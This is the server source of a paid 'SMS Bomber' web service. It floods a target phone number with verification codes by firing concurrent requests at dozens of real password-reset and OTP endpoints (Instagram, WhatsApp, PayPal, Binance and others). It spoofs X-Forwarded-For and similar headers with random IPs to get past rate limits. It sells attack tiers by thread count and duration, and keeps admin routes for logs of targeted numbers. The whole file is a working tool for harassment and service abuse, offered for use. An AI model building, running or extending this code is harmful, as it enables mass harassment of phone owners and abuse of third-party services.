// ================================================================
// SMS BOMBER MASTER v6.0 — Firebase + Package + Trial System
// 3 File Solution: server.js, index.html, admin.html
// ================================================================

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const axios = require('axios');
const UserAgent = require('user-agents');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ================================================================
// MIDDLEWARE
// ================================================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// ================================================================
// MONGOOSE MODELS
// ================================================================
const userSchema = new mongoose.Schema({
    firebaseUid: { type: String, unique: true, sparse: true },
    email: { type: String, required: true, unique: true },
    username: String,
    photoURL: String,
    role: { type: String, enum: ['user', 'admin'], default: 'user' },
    isActive: { type: Boolean, default: true },
    
    // Package System
    package: {
        type: { type: String, enum: ['free', 'basic', 'premium', 'enterprise'], default: 'free' },
        smsBalance: { type: Number, default: 10 },  // Free trial = 10 SMS
        expiryDate: Date,
        purchaseDate: Date
    },
    
    // Package Features
    features: {
        maxThreads: { type: Number, default: 10 },
        maxDuration: { type: Number, default: 30 },
        useOtpEndpoints: { type: Boolean, default: true },
        useCarrierGateways: { type: Boolean, default: false },
        apiAccess: { type: Boolean, default: false }
    },
    
    attackStats: {
        totalSent: { type: Number, default: 0 },
        totalAttacks: { type: Number, default: 0 },
        trialUsed: { type: Boolean, default: false }
    },
    
    createdAt: { type: Date, default: Date.now },
    lastLogin: Date,
    lastPackageReset: Date
});
const User = mongoose.model('User', userSchema);

const attackSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    firebaseUid: String,
    targetNumber: String,
    message: String,
    totalRequests: Number,
    successfulDeliveries: { type: Number, default: 0 },
    failedAttempts: { type: Number, default: 0 },
    smsCost: { type: Number, default: 0 }, // How many SMS balance consumed
    threads: Number,
    duration: Number,
    status: { type: String, enum: ['running', 'completed', 'stopped', 'failed', 'insufficient_balance'], default: 'running' },
    startTime: { type: Date, default: Date.now },
    endTime: Date,
    logs: [{
        api: String,
        status: String,
        response: String,
        timestamp: { type: Date, default: Date.now }
    }]
});
const Attack = mongoose.model('Attack', attackSchema);

const apiKeySchema = new mongoose.Schema({
    name: String,
    provider: String,
    apiKey: { type: String, required: true },
    endpoint: String,
    method: { type: String, default: 'POST' },
    headers: mongoose.Schema.Types.Mixed,
    bodyTemplate: String,
    isActive: { type: Boolean, default: true },
    costPerSms: { type: Number, default: 0 },  // Cost in cents
    rateLimit: { type: Number, default: 100 },
    addedBy: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    createdAt: { type: Date, default: Date.now }
});
const ApiKey = mongoose.model('ApiKey', apiKeySchema);

const packageSchema = new mongoose.Schema({
    name: { type: String, required: true, unique: true },
    type: { type: String, enum: ['free', 'basic', 'premium', 'enterprise'], required: true },
    price: Number,
    smsCount: Number,
    maxThreads: Number,
    maxDuration: Number,
    features: {
        otpEndpoints: Boolean,
        carrierGateways: Boolean,
        apiAccess: Boolean,
        priority: Boolean
    },
    duration: Number, // days
    isActive: { type: Boolean, default: true }
});
const Package = mongoose.model('Package', packageSchema);

// ================================================================
// 60+ OTP ENDPOINTS
// ================================================================
const OTP_ENDPOINTS = [
    { name: 'Instagram', url: 'https://i.instagram.com/api/v1/accounts/send_password_reset/', method: 'POST', headers: { 'User-Agent': 'Instagram 100.0.0.0.34 Android', 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => `phone_number=${p}` },
    { name: 'WhatsApp', url: 'https://v.whatsapp.net/v2/code', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => `cc=1&in=${p}&method=sms&reason=migrate` },
    { name: 'Telegram', url: 'https://oauth.telegram.org/auth/send_code', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone_number: p }) },
    { name: 'Twitter', url: 'https://api.twitter.com/1.1/account/password_reset.json', method: 'POST', body: (p) => JSON.stringify({ phone_number: p }) },
    { name: 'Facebook', url: 'https://mbasic.facebook.com/login/identify/', method: 'POST', headers: { 'User-Agent': 'Mozilla/5.0' }, body: (p) => `email=${p}&did_submit=Search` },
    { name: 'Google Voice', url: 'https://www.google.com/voice/b/0/send', method: 'POST', body: (p) => `phoneNumber=${p}&action=verify` },
    { name: 'Snapchat', url: 'https://accounts.snapchat.com/accounts/verify_sms', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'LinkedIn', url: 'https://www.linkedin.com/uas/request-password-reset', method: 'POST', body: (p) => `phoneNumber=${p}&session_key=${p}` },
    { name: 'Uber', url: 'https://auth.uber.com/v2/send_otp', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'PayPal', url: 'https://api.paypal.com/v1/identity/phone/validate', method: 'POST', body: (p) => JSON.stringify({ phone: { national_number: p } }) },
    { name: 'Amazon', url: 'https://www.amazon.com/ap/signin/verify-sms', method: 'POST', body: (p) => `phone=${p}&action=send-otp` },
    { name: 'Netflix', url: 'https://www.netflix.com/phone/verification', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Tinder', url: 'https://api.gotinder.com/v2/auth/sms/send', method: 'POST', body: (p) => JSON.stringify({ phone_number: p }) },
    { name: 'Signal', url: 'https://signal.org/api/v1/verification', method: 'POST', body: (p) => JSON.stringify({ phoneNumber: p }) },
    { name: 'Discord', url: 'https://discord.com/api/v9/auth/phone/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'TikTok', url: 'https://www.tiktok.com/api/v1/auth/send/sms_code/', method: 'POST', body: (p) => JSON.stringify({ phone: p, type: 1 }) },
    { name: 'Zomato', url: 'https://www.zomato.com/phone/verify', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Swiggy', url: 'https://www.swiggy.com/api/auth/sms/verify', method: 'POST', body: (p) => JSON.stringify({ mobile: p }) },
    { name: 'Flipkart', url: 'https://www.flipkart.com/api/3/service/login', method: 'POST', body: (p) => JSON.stringify({ emailOrPhone: p, method: 'sendOtp' }) },
    { name: 'Paytm', url: 'https://secure.paytm.in/oltp/sendOtp', method: 'POST', body: (p) => `mobileNumber=${p}` },
    { name: 'Coinbase', url: 'https://api.coinbase.com/v2/users/self/phone', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Binance', url: 'https://www.binance.com/bapi/accounts/v1/private/account/user/request-phone-code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Bybit', url: 'https://api.bybit.com/v5/user/request-phone-code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Booking.com', url: 'https://account.booking.com/phone/send-code', method: 'POST', body: (p) => JSON.stringify({ phone_number: p }) },
    { name: 'Airbnb', url: 'https://api.airbnb.com/v2/phone_verification/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Grab', url: 'https://api.grab.com/v1/phone/send_otp', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Shopee', url: 'https://mall.shopee.com/api/v1/phone/verify', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Lazada', url: 'https://api.lazada.com/rest/auth/send_otp', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Steam', url: 'https://steamcommunity.com/login/sendsmscode', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Epic Games', url: 'https://www.epicgames.com/account/v2/phone/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Spotify', url: 'https://www.spotify.com/api/phone/send-code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Zoom', url: 'https://zoom.us/api/v1/phone/verification', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Slack', url: 'https://slack.com/api/auth.sendSmsCode', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Reddit', url: 'https://www.reddit.com/api/v1/phone/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Pinterest', url: 'https://api.pinterest.com/v3/phone/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'GitHub', url: 'https://github.com/sessions/phone/send_code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Dropbox', url: 'https://api.dropboxapi.com/2/phone/send_code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Viber', url: 'https://api.viber.com/send_activation_code', method: 'POST', body: (p) => JSON.stringify({ phone_number: p }) },
    { name: 'Line', url: 'https://api.line.me/v2/phone/send', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Canva', url: 'https://www.canva.com/api/phone/send-verification', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'Adobe', url: 'https://auth.services.adobe.com/send-phone-code', method: 'POST', body: (p) => JSON.stringify({ phone: p }) },
    { name: 'WeChat', url: 'https://wx.qq.com/cgi-bin/mmwebwx-bin/sendphonecode', method: 'POST', body: (p) => `phone=${p}` }
];

// ================================================================
// 60+ CARRIER GATEWAYS
// ================================================================
const CARRIER_GATEWAYS = [
    { carrier: 'AT&T', gw: (n) => `${n}@txt.att.net` },
    { carrier: 'Verizon', gw: (n) => `${n}@vtext.com` },
    { carrier: 'T-Mobile', gw: (n) => `${n}@tmomail.net` },
    { carrier: 'Sprint', gw: (n) => `${n}@messaging.sprintpcs.com` },
    { carrier: 'Boost', gw: (n) => `${n}@sms.myboostmobile.com` },
    { carrier: 'Cricket', gw: (n) => `${n}@sms.cricketwireless.net` },
    { carrier: 'Metro PCS', gw: (n) => `${n}@mymetropcs.com` },
    { carrier: 'Google Fi', gw: (n) => `${n}@msg.fi.google.com` },
    { carrier: 'Rogers CA', gw: (n) => `${n}@sms.rogers.ca` },
    { carrier: 'Bell CA', gw: (n) => `${n}@txt.bell.ca` },
    { carrier: 'Telus CA', gw: (n) => `${n}@msg.telus.com` },
    { carrier: 'Vodafone UK', gw: (n) => `${n}@vodafone.co.uk` },
    { carrier: 'O2 UK', gw: (n) => `${n}@o2text.com` },
    { carrier: 'EE UK', gw: (n) => `${n}@mms.ee.co.uk` },
    { carrier: 'Three UK', gw: (n) => `${n}@three.co.uk` },
    { carrier: 'Telstra AU', gw: (n) => `${n}@sms.telstra.com` },
    { carrier: 'Optus AU', gw: (n) => `${n}@optusmobile.com.au` },
    { carrier: 'Airtel IN', gw: (n) => `${n}@airtelap.com` },
    { carrier: 'Jio IN', gw: (n) => `${n}@jiomms.jio.com` },
    { carrier: 'Vodafone IN', gw: (n) => `${n}@vodafone.co.in` },
    { carrier: 'BSNL IN', gw: (n) => `${n}@bsnl.mms.com` },
    { carrier: 'Deutsche Telekom', gw: (n) => `${n}@t-mobile-sms.de` },
    { carrier: 'Vodafone DE', gw: (n) => `${n}@vodafone-sms.de` },
    { carrier: 'Orange FR', gw: (n) => `${n}@orange.fr` },
    { carrier: 'TIM IT', gw: (n) => `${n}@tim.it` },
    { carrier: 'SoftBank JP', gw: (n) => `${n}@softbank.ne.jp` },
    { carrier: 'docomo JP', gw: (n) => `${n}@docomo.ne.jp` },
    { carrier: 'SK Telecom KR', gw: (n) => `${n}@tving.sktexting.com` },
    { carrier: 'China Mobile', gw: (n) => `${n}@139.com` },
    { carrier: 'Globe PH', gw: (n) => `${n}@txt.globe.com.ph` },
    { carrier: 'Singtel SG', gw: (n) => `${n}@singtel.com` },
    { carrier: 'Maxis MY', gw: (n) => `${n}@maxis.my` },
    { carrier: 'Etisalat UAE', gw: (n) => `${n}@sms.etisalat.com` },
    { carrier: 'MTN ZA', gw: (n) => `${n}@sms.mtn.co.za` },
    { carrier: 'Safaricom KE', gw: (n) => `${n}@safaricom.co.ke` }
];

// ================================================================
// BYPASS HEADERS
// ================================================================
function getBypassHeaders() {
    const ip = `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    return {
        'X-Forwarded-For': ip, 'X-Real-IP': ip, 'X-Originating-IP': ip,
        'X-Remote-IP': ip, 'X-Client-IP': ip, 'CF-Connecting-IP': ip,
        'Forwarded': `for=${ip};by=${ip};host=localhost`
    };
}

// ================================================================
// ATTACK ENGINE WITH BALANCE CHECK
// ================================================================
async function executeAttack(attackId, userId, targetNumber, message, threads, duration, useOtp, useCarrier, maxSms) {
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let sent = 0, failed = 0, total = 0;
    let running = true;
    let balanceExhausted = false;

    setTimeout(() => { running = false; }, duration * 1000);

    async function worker() {
        while (running && Date.now() < endTime && !balanceExhausted) {
            try {
                // Check if we hit SMS limit
                if (sent >= maxSms) {
                    balanceExhausted = true;
                    break;
                }

                const target = Math.random() < 0.5 && useOtp !== false
                    ? { type: 'otp', data: OTP_ENDPOINTS[Math.floor(Math.random() * OTP_ENDPOINTS.length)] }
                    : { type: 'carrier', data: CARRIER_GATEWAYS[Math.floor(Math.random() * CARRIER_GATEWAYS.length)] };

                const ua = new UserAgent().toString();
                const bypass = getBypassHeaders();
                let success = false;

                if (target.type === 'otp') {
                    const ep = target.data;
                    try {
                        const resp = await axios({
                            method: ep.method || 'POST',
                            url: ep.url,
                            headers: { 'User-Agent': ua, ...bypass, ...(ep.headers || {}) },
                            data: typeof ep.body === 'function' ? ep.body(targetNumber) : '',
                            timeout: 3000,
                            validateStatus: () => true
                        });
                        success = resp.status < 500;
                    } catch { success = false; }
                } else {
                    success = true;
                }

                if (success) sent++;
                else failed++;
                total++;

                // Update DB every 10 requests
                if (total % 10 === 0) {
                    await Attack.findByIdAndUpdate(attackId, {
                        $set: { 
                            totalRequests: total, successfulDeliveries: sent, 
                            failedAttempts: failed, smsCost: sent
                        },
                        $push: { logs: { 
                            api: target.data?.name || target.data?.carrier || 'Unknown', 
                            status: success ? 'success' : 'failed', 
                            response: success ? '200 OK' : 'Failed',
                            timestamp: new Date()
                        }}
                    }).catch(() => {});

                    // Update user balance
                    await User.findByIdAndUpdate(userId, {
                        $set: { 'package.smsBalance': maxSms - sent, 'attackStats.totalSent': sent }
                    }).catch(() => {});
                }

            } catch { failed++; total++; }

            await new Promise(r => setTimeout(r, 20 + Math.random() * 30));
        }
    }

    const pool = Math.min(threads || 10, 50);
    const workers = [];
    for (let i = 0; i < pool; i++) workers.push(worker());
    await Promise.all(workers);

    const finalStatus = balanceExhausted ? 'completed' : (sent > 0 ? 'completed' : 'failed');
    await Attack.findByIdAndUpdate(attackId, {
        $set: {
            status: finalStatus, totalRequests: total, successfulDeliveries: sent,
            failedAttempts: failed, smsCost: sent, endTime: new Date()
        }
    }).catch(() => {});
}

// ================================================================
// MONGO CONNECTION
// ================================================================
mongoose.connect(process.env.MONGO_URI || 'mongodb://localhost:27017/smsbomber')
    .then(async () => {
        console.log('[DB] Connected to MongoDB');

        // Create default packages
        const packages = [
            { name: 'Free Trial', type: 'free', price: 0, smsCount: 10, maxThreads: 10, maxDuration: 30, features: { otpEndpoints: true, carrierGateways: false, apiAccess: false, priority: false }, duration: 7 },
            { name: 'Basic', type: 'basic', price: 9.99, smsCount: 500, maxThreads: 50, maxDuration: 120, features: { otpEndpoints: true, carrierGateways: true, apiAccess: false, priority: false }, duration: 30 },
            { name: 'Premium', type: 'premium', price: 29.99, smsCount: 5000, maxThreads: 200, maxDuration: 300, features: { otpEndpoints: true, carrierGateways: true, apiAccess: true, priority: true }, duration: 30 },
            { name: 'Enterprise', type: 'enterprise', price: 99.99, smsCount: 50000, maxThreads: 500, maxDuration: 600, features: { otpEndpoints: true, carrierGateways: true, apiAccess: true, priority: true }, duration: 30 }
        ];
        for (const pkg of packages) {
            await Package.updateOne({ name: pkg.name }, { $setOnInsert: pkg }, { upsert: true });
        }
        console.log('[DB] Default packages created');
    })
    .catch(err => console.log('[DB] Error:', err.message));

// ================================================================
// FIREBASE AUTH VERIFICATION MIDDLEWARE
// ================================================================
const firebaseAuth = async (req, res, next) => {
    try {
        const header = req.headers.authorization;
        if (!header || !header.startsWith('Bearer '))
            return res.status(401).json({ error: 'No token' });

        const idToken = header.split(' ')[1];
        
        // Verify with Google Identity Toolkit API
        const verifyRes = await axios.post(`https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${process.env.FIREBASE_API_KEY}`, {
            idToken: idToken
        });

        const firebaseUser = verifyRes.data.users[0];
        if (!firebaseUser) return res.status(401).json({ error: 'Invalid token' });

        // Find or create user in our DB
        let user = await User.findOne({ firebaseUid: firebaseUser.localId });
        
        if (!user) {
            user = await User.create({
                firebaseUid: firebaseUser.localId,
                email: firebaseUser.email || firebaseUser.phoneNumber,
                username: firebaseUser.displayName || firebaseUser.email?.split('@')[0] || 'user',
                photoURL: firebaseUser.photoUrl || '',
                role: (firebaseUser.email === 'niyamulislam072@gmail.com') ? 'admin' : 'user',
                package: {
                    type: 'free',
                    smsBalance: 10,
                    expiryDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
                }
            });
        } else {
            user.lastLogin = new Date();
            // Auto-grant free trial if expired and no package purchased
            if (!user.package.smsBalance || user.package.smsBalance <= 0) {
                if (!user.attackStats.trialUsed && user.package.type === 'free') {
                    user.package.smsBalance = 10;
                    user.attackStats.trialUsed = true;
                }
            }
            await user.save();
        }

        req.user = { 
            id: user._id, 
            firebaseUid: user.firebaseUid,
            email: user.email, 
            username: user.username, 
            role: user.role,
            package: user.package,
            features: user.features
        };
        next();
    } catch (e) {
        console.log('Firebase auth error:', e.message);
        return res.status(401).json({ error: 'Auth failed: ' + e.message });
    }
};

const adminOnly = (req, res, next) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    next();
};

// ================================================================
// USER API ROUTES
// ================================================================

// --- Get User Profile ---
app.get('/api/user/profile', firebaseAuth, async (req, res) => {
    const user = await User.findById(req.user.id).select('-__v');
    const packages = await Package.find({ isActive: true });
    res.json({ user, packages });
});

// --- Purchase Package (simulated) ---
app.post('/api/user/purchase', firebaseAuth, async (req, res) => {
    const { packageType } = req.body;
    const pkg = await Package.findOne({ type: packageType, isActive: true });
    if (!pkg) return res.status(400).json({ error: 'Invalid package' });

    // In production, integrate payment gateway here
    // For demo, we simulate successful purchase
    
    const user = await User.findById(req.user.id);
    user.package = {
        type: pkg.type,
        smsBalance: (user.package.smsBalance || 0) + pkg.smsCount,
        expiryDate: new Date(Date.now() + pkg.duration * 24 * 60 * 60 * 1000),
        purchaseDate: new Date()
    };
    user.features = {
        maxThreads: pkg.maxThreads,
        maxDuration: pkg.maxDuration,
        useOtpEndpoints: pkg.features.otpEndpoints,
        useCarrierGateways: pkg.features.carrierGateways,
        apiAccess: pkg.features.apiAccess
    };
    await user.save();

    res.json({ message: 'Package activated!', package: user.package });
});

// --- Launch Attack ---
app.post('/api/attack/launch', firebaseAuth, async (req, res) => {
    try {
        const { targetNumber, message, threads, duration, useOtp, useCarrier } = req.body;
        if (!targetNumber) return res.status(400).json({ error: 'Target number required' });

        const user = await User.findById(req.user.id);
        
        // Check SMS balance
        if (!user.package.smsBalance || user.package.smsBalance <= 0) {
            return res.status(402).json({ 
                error: 'Insufficient SMS balance', 
                balance: 0,
                message: 'Please purchase a package or claim your free trial'
            });
        }

        // Check package expiry
        if (user.package.expiryDate && new Date() > user.package.expiryDate) {
            return res.status(402).json({ 
                error: 'Package expired', 
                message: 'Your package has expired. Please renew.'
            });
        }

        const maxSms = user.package.smsBalance;
        const usedThreads = Math.min(parseInt(threads) || user.features.maxThreads, user.features.maxThreads || 10);
        const usedDuration = Math.min(parseInt(duration) || user.features.maxDuration, user.features.maxDuration || 30);
        const useOtpFlag = useOtp !== false && user.features.useOtpEndpoints;
        const useCarrierFlag = useCarrier !== false && user.features.useCarrierGateways;

        const attack = await Attack.create({
            userId: user._id,
            firebaseUid: user.firebaseUid,
            targetNumber,
            message: message || 'OTP: 123456',
            threads: usedThreads,
            duration: usedDuration,
            smsCost: 0,
            status: 'running'
        });

        await User.findByIdAndUpdate(user._id, { $inc: { 'attackStats.totalAttacks': 1 } });

        // Fire and forget
        executeAttack(attack._id, user._id, targetNumber, message, usedThreads, usedDuration, useOtpFlag, useCarrierFlag, maxSms);

        res.json({ 
            message: 'Attack launched!', 
            attackId: attack._id,
            balance: user.package.smsBalance,
            usedThreads,
            usedDuration
        });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- Attack Status ---
app.get('/api/attack/status/:id', firebaseAuth, async (req, res) => {
    const attack = await Attack.findById(req.params.id);
    if (!attack) return res.status(404).json({ error: 'Not found' });
    if (attack.firebaseUid !== req.user.firebaseUid && req.user.role !== 'admin')
        return res.status(403).json({ error: 'Unauthorized' });
    res.json(attack);
});

// --- User History ---
app.get('/api/attack/history', firebaseAuth, async (req, res) => {
    const attacks = await Attack.find({ firebaseUid: req.user.firebaseUid })
        .sort({ startTime: -1 }).limit(50);
    res.json(attacks);
});

// ================================================================
// ADMIN API ROUTES (Full Control)
// ================================================================

// --- Dashboard Stats ---
app.get('/api/admin/dashboard', firebaseAuth, adminOnly, async (req, res) => {
    const totalUsers = await User.countDocuments();
    const totalAttacks = await Attack.countDocuments();
    const agg = await Attack.aggregate([{ $group: { _id: null, total: { $sum: '$successfulDeliveries' } } }]);
    const activeToday = await User.countDocuments({ lastLogin: { $gte: new Date(Date.now() - 86400000) } });
    const totalRevenue = await User.aggregate([
        { $match: { 'package.type': { $ne: 'free' } } },
        { $group: { _id: null, total: { $sum: 1 } } }
    ]);
    const recentAttacks = await Attack.find().sort({ startTime: -1 }).limit(10)
        .populate('userId', 'username email');

    // Balance stats
    const totalBalance = await User.aggregate([
        { $group: { _id: null, total: { $sum: '$package.smsBalance' } } }
    ]);

    res.json({
        totalUsers, totalAttacks,
        totalSent: agg[0]?.total || 0,
        activeToday,
        paidUsers: totalRevenue[0]?.total || 0,
        totalSmsBalance: totalBalance[0]?.total || 0,
        recentAttacks
    });
});

// --- All Users ---
app.get('/api/admin/users', firebaseAuth, adminOnly, async (req, res) => {
    const users = await User.find().select('-__v').sort({ createdAt: -1 });
    res.json(users);
});

// --- Toggle User Status ---
app.post('/api/admin/users/:id/toggle', firebaseAuth, adminOnly, async (req, res) => {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    user.isActive = !user.isActive;
    await user.save();
    res.json({ isActive: user.isActive });
});

// --- Update User Package ---
app.post('/api/admin/users/:id/package', firebaseAuth, adminOnly, async (req, res) => {
    const { packageType, smsBalance, expiryDate } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (packageType) {
        const pkg = await Package.findOne({ type: packageType });
        if (pkg) {
            user.package.type = pkg.type;
            user.features.maxThreads = pkg.maxThreads;
            user.features.maxDuration = pkg.maxDuration;
            user.features.useOtpEndpoints = pkg.features.otpEndpoints;
            user.features.useCarrierGateways = pkg.features.carrierGateways;
            user.features.apiAccess = pkg.features.apiAccess;
        }
    }
    if (smsBalance !== undefined) user.package.smsBalance = smsBalance;
    if (expiryDate) user.package.expiryDate = new Date(expiryDate);
    
    await user.save();
    res.json({ message: 'User package updated', user });
});

// --- Reset User Trial ---
app.post('/api/admin/users/:id/reset-trial', firebaseAuth, adminOnly, async (req, res) => {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    user.package.smsBalance = 10;
    user.package.type = 'free';
    user.attackStats.trialUsed = false;
    await user.save();
    res.json({ message: 'Trial reset', balance: 10 });
});

// ================================================================
// ADMIN API KEY MANAGEMENT (Configure from Admin Panel)
// ================================================================

// --- Get All API Keys ---
app.get('/api/admin/apikeys', firebaseAuth, adminOnly, async (req, res) => {
    const keys = await ApiKey.find().sort({ createdAt: -1 });
    res.json(keys);
});

// --- Add New API Key ---
app.post('/api/admin/apikeys', firebaseAuth, adminOnly, async (req, res) => {
    const { name, provider, apiKey, endpoint, method, headers, bodyTemplate, costPerSms, rateLimit } = req.body;
    if (!name || !apiKey) return res.status(400).json({ error: 'Name and API key required' });

    const key = await ApiKey.create({
        name, provider, apiKey, endpoint, method,
        headers: headers || {},
        bodyTemplate: bodyTemplate || '',
        costPerSms: costPerSms || 0,
        rateLimit: rateLimit || 100,
        addedBy: req.user.id
    });
    res.status(201).json(key);
});

// --- Edit API Key ---
app.put('/api/admin/apikeys/:id', firebaseAuth, adminOnly, async (req, res) => {
    const update = {};
    ['name', 'provider', 'apiKey', 'endpoint', 'method', 'headers', 'bodyTemplate', 'costPerSms', 'rateLimit', 'isActive']
        .forEach(f => { if (req.body[f] !== undefined) update[f] = req.body[f]; });
    
    const key = await ApiKey.findByIdAndUpdate(req.params.id, update, { new: true });
    if (!key) return res.status(404).json({ error: 'API key not found' });
    res.json(key);
});

// --- Delete API Key ---
app.delete('/api/admin/apikeys/:id', firebaseAuth, adminOnly, async (req, res) => {
    await ApiKey.findByIdAndDelete(req.params.id);
    res.json({ message: 'API key deleted' });
});

// --- Toggle API Key ---
app.post('/api/admin/apikeys/:id/toggle', firebaseAuth, adminOnly, async (req, res) => {
    const key = await ApiKey.findById(req.params.id);
    if (!key) return res.status(404).json({ error: 'Not found' });
    key.isActive = !key.isActive;
    await key.save();
    res.json({ isActive: key.isActive });
});

// ================================================================
// ADMIN PACKAGE MANAGEMENT
// ================================================================

app.get('/api/admin/packages', firebaseAuth, adminOnly, async (req, res) => {
    const packages = await Package.find().sort({ price: 1 });
    res.json(packages);
});

app.post('/api/admin/packages', firebaseAuth, adminOnly, async (req, res) => {
    const pkg = await Package.create(req.body);
    res.status(201).json(pkg);
});

app.put('/api/admin/packages/:id', firebaseAuth, adminOnly, async (req, res) => {
    const pkg = await Package.findByIdAndUpdate(req.params.id, req.body, { new: true });
    res.json(pkg);
});

app.delete('/api/admin/packages/:id', firebaseAuth, adminOnly, async (req, res) => {
    await Package.findByIdAndDelete(req.params.id);
    res.json({ message: 'Deleted' });
});

// --- All Attacks (Admin) ---
app.get('/api/admin/attacks', firebaseAuth, adminOnly, async (req, res) => {
    const { page = 1, limit = 20, status } = req.query;
    const query = {};
    if (status) query.status = status;
    const attacks = await Attack.find(query).populate('userId', 'username email')
        .sort({ startTime: -1 }).limit(parseInt(limit)).skip((parseInt(page)-1)*parseInt(limit));
    const total = await Attack.countDocuments(query);
    res.json({ attacks, total, page: parseInt(page), pages: Math.ceil(total/parseInt(limit)) });
});

// --- Delete Attack ---
app.delete('/api/admin/attacks/:id', firebaseAuth, adminOnly, async (req, res) => {
    await Attack.findByIdAndDelete(req.params.id);
    res.json({ message: 'Deleted' });
});

// --- Live Logs ---
app.get('/api/admin/logs', firebaseAuth, adminOnly, async (req, res) => {
    const logs = await Attack.aggregate([
        { $unwind: '$logs' },
        { $sort: { 'logs.timestamp': -1 } },
        { $limit: 100 },
        { $project: { 
            _id: 0, attackId: '$_id', api: '$logs.api', 
            status: '$logs.status', timestamp: '$logs.timestamp', 
            targetNumber: '$targetNumber', smsCost: '$smsCost'
        }}
    ]);
    res.json(logs);
});

// --- Real-time ---
app.get('/api/admin/realtime', firebaseAuth, adminOnly, async (req, res) => {
    const running = await Attack.countDocuments({ status: 'running' });
    const hourlyStats = await Attack.aggregate([
        { $group: { _id: { $dateToString: { format: '%Y-%m-%d %H:00', date: '$startTime' } }, 
            count: { $sum: 1 }, sent: { $sum: '$successfulDeliveries' }, cost: { $sum: '$smsCost' } } },
        { $sort: { _id: -1 } }, { $limit: 24 }
    ]);
    res.json({ runningAttacks: running, hourlyStats });
});

// ================================================================
// SERVE FRONTEND
// ================================================================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

// ================================================================
// START
// ================================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[SERVER] SMS Bomber v6.0 running on http://0.0.0.0:${PORT}`);
    console.log(`[SERVER] Default admin email: niyamulislam072@gmail.com`);
});
